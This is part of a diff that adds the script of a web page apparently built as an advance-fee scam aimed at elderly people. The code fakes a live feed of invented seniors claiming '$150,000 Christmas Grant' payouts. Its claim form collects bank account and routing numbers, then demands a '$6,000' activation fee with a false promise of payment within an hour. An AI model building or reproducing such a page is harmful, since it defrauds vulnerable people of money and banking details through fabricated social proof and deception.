+                const name = card.querySelector('.person-name').textContent.toLowerCase();
+                const bio = card.querySelector('.person-bio').textContent.toLowerCase();
+                
+                if (name.includes(searchTerm) || bio.includes(searchTerm)) {
+                    card.style.display = 'block';
+                } else {
+                    card.style.display = 'none';
+                }
+            });
+        });
+        
+        // Testimonial Carousel
+        const testimonials = document.querySelectorAll('.testimonial');
+        const indicators = document.querySelectorAll('.indicator');
+        let currentTestimonial = 0;
+        
+        function showTestimonial(index) {
+            testimonials.forEach(testimonial => {
+                testimonial.classList.remove('active');
+            });
+            indicators.forEach(indicator => {
+                indicator.classList.remove('active');
+            });
+            
+            testimonials[index].classList.add('active');
+            indicators[index].classList.add('active');
+            currentTestimonial = index;
+        }
+        
+        // Auto-rotate testimonials
+        setInterval(() => {
+            currentTestimonial = (currentTestimonial + 1) % testimonials.length;
+            showTestimonial(currentTestimonial);
+        }, 5000);
+        
+        // Manual testimonial selection
+        indicators.forEach((indicator, index) => {
+            indicator.addEventListener('click', () => {
+                showTestimonial(index);
+            });
+        });
+        
+        // Live Claims Simulation
+        const liveClaims = document.getElementById('liveClaims');
+        const seniorNames = [
+            "Harold Jenkins", "Ethel Montgomery", "Walter Schmidt", "Beatrice Carter",
+            "Franklin Pierce", "Gladys Wilson", "Clarence Miller", "Dorothy Parker",
+            "Reginald Thompson", "Agnes Cooper", "Albert Foster", "Mildred Bennett"
+        ];
+        
+        const locations = [
+            "Phoenix, AZ", "Orlando, FL", "Denver, CO", "Portland, OR",
+            "Austin, TX", "Nashville, TN", "Charlotte, NC", "Columbus, OH",
+            "Indianapolis, IN", "Salt Lake City, UT", "Las Vegas, NV", "Albuquerque, NM"
+        ];
+        
+        function addLiveClaim() {
+            const randomName = seniorNames[Math.floor(Math.random() * seniorNames.length)];
+            const randomLocation = locations[Math.floor(Math.random() * locations.length)];
+            const now = new Date();
+            const timeString = now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
+            const age = Math.floor(Math.random() * 20) + 65;
+            
+            const claimItem = document.createElement('div');
+            claimItem.className = 'live-claim-item';
+            claimItem.innerHTML = `
+                <div class="live-claim-name">${randomName}</div>
+                <div class="live-claim-amount">🎁 $150,000 Christmas Grant Claimed!</div>
+                <div style="font-size: 0.9rem; color: #666;">From: ${randomLocation} | Age: ${age}</div>
+                <div class="live-claim-time">${timeString}</div>
+            `;
+            
+            // Add to top of list
+            liveClaims.insertBefore(claimItem, liveClaims.firstChild);
+            
+            // Limit list to 8 items
+            if (liveClaims.children.length > 8) {
+                liveClaims.removeChild(liveClaims.lastChild);
+            }
+        }
+        
+        // Add initial claims
+        for (let i = 0; i < 5; i++) {
+            setTimeout(() => addLiveClaim(), i * 1000);
+        }
+        
+        // Add new claims periodically
+        setInterval(() => {
+            setTimeout(addLiveClaim, Math.random() * 20000 + 10000);
+        }, 15000);
+        
+        // Claim Modal Functionality
+        let currentStep = 1;
+        let selectedPerson = '';
+        
+        function openClaimModal(personName) {
+            selectedPerson = personName;
+            currentStep = 1;
+            updateStepIndicator();
+            document.getElementById('claimModal').style.display = 'block';
+            document.body.style.overflow = 'hidden';
+        }
+        
+        function closeClaimModal() {
+            document.getElementById('claimModal').style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+        
+        function nextStep() {
+            if (currentStep < 3) {
+                // Validate step 1
+                if (currentStep === 1) {
+                    const requiredFields = ['fullName', 'bankName', 'accountNumber', 'routingNumber', 'accountType'];
+                    let isValid = true;
+                    
+                    requiredFields.forEach(fieldId => {
+                        const field = document.getElementById(fieldId);
+                        if (!field.value.trim()) {
+                            isValid = false;
+                            field.style.borderColor = '#dc3545';
+                        } else {
+                            field.style.borderColor = '#e0e0e0';
+                        }
+                    });
+                    
+                    if (!isValid) {
+                        alert('Please fill in all required fields before proceeding.');
+                        return;
+                    }
+                }
+                
+                document.getElementById(`step${currentStep}`).classList.remove('active');
+                currentStep++;
+                document.getElementById(`step${currentStep}`).classList.add('active');
+                updateStepIndicator();
+                
+                // Simulate processing for step 2
+                if (currentStep === 2) {
+                    setTimeout(() => {
+                        document.querySelector('.loading-text').textContent = 'Processing complete! Proceed to activation fee payment.';
+                    }, 3000);
+                }
+            }
+        }
+        
+        function prevStep() {
+            if (currentStep > 1) {
+                document.getElementById(`step${currentStep}`).classList.remove('active');
+                currentStep--;
+                document.getElementById(`step${currentStep}`).classList.add('active');
+                updateStepIndicator();
+            }
+        }
+        
+        function updateStepIndicator() {
+            // Update dots
+            for (let i = 1; i <= 3; i++) {
+                const dot = document.getElementById(`step${i}Dot`);
+                dot.classList.remove('active', 'completed');
+                
+                if (i < currentStep) {
+                    dot.classList.add('completed');
+                } else if (i === currentStep) {
+                    dot.classList.add('active');
+                }
+            }
+        }
+        
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                const btn = event.target;
+                const originalText = btn.textContent;
+                btn.textContent = 'Copied!';
+                btn.classList.add('copied');
+                
+                setTimeout(() => {
+                    btn.textContent = originalText;
+                    btn.classList.remove('copied');
+                }, 2000);
+            }).catch(err => {
+                console.error('Failed to copy: ', err);
+            });
+        }
+        
+        function completePayment() {
+            alert('Thank you! Once we verify your $6,000 payment, your $150,000 grant will be transferred within 1 hour. Please keep your transaction receipt for verification.');
+            closeClaimModal();
+        }
+        
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const modal = document.getElementById('claimModal');
+            if (event.target === modal) {
+                closeClaimModal();
+            }
+        }
+        
+    </script>
+</body>
+</html>
